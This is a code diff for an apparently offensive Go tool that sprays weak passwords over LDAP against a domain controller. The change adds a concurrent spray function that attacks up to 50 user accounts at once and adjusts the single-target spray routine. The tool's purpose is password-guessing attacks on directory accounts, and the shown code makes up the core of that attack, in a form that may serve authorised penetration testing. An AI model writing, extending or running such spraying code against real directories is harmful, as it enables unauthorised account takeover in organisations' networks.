@@ -10,6 +10,7 @@ import (
 	"net/http"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/go-ldap/ldap/v3"
@@ -55,20 +56,40 @@ func main() {
 	}
 	passwords := getWeakPasswords()
 	fmt.Printf("Password count: %d\n", len(passwords))
-	// for _, password := range passwords {
-	// 	fmt.Printf("%s\n", password)
-	// }
-	pass, err := targetedSpray(passwords, *victim, *domain, *domainController, policy)
-	if err != nil {
-		fmt.Printf("Error spraying %s: %s", *victim, pass)
+	if *victim != "" {
+		var wg sync.WaitGroup
+		wg.Add(1)
+		pass, err := targetedSpray(passwords, *victim, *domain, *domainController, policy, &wg)
+		if err != nil {
+			fmt.Printf("Error spraying %s: %s", *victim, pass)
+		}
+	} else {
+		spray(users, passwords, *domain, *domainController, policy, 50)
 	}
 }
 
-// func spray(users, passwords []string, domain, server string){
+func spray(users, passwords []string, domain, server string, policy PasswordPolicy, threads int) {
+	fmt.Printf("Spraying %d users concurrently\n", len(users))
+	maxGoroutines := threads
+	guard := make(chan struct{}, maxGoroutines)
+	var wg sync.WaitGroup
+	wg.Add(len(users))
+	for _, user := range users {
+		guard <- struct{}{} // would block if guard channel is already filled
+		go func(user string, passwords []string, domain, server string, policy PasswordPolicy, wg *sync.WaitGroup) {
+			fmt.Printf("Spraying %s\n", user)
+			targetedSpray(passwords, user, domain, server, policy, wg)
+			<-guard
+		}(user, passwords, domain, server, policy, &wg)
 
-// }
+		// fmt.Printf("Spraying %s\n", user)
+		// go targetedSpray(passwords, user, domain, server, policy, &wg)
+	}
+	wg.Wait()
+}
 
-func targetedSpray(passwords []string, user, domain, server string, policy PasswordPolicy) (string, error) {
+func targetedSpray(passwords []string, user, domain, server string, policy PasswordPolicy, wg *sync.WaitGroup) (string, error) {
+	defer wg.Done()
 	var attempts int
 	if DEBUG {
 		fmt.Printf("[DEBUG] Password Policy: %#+v\n", policy)
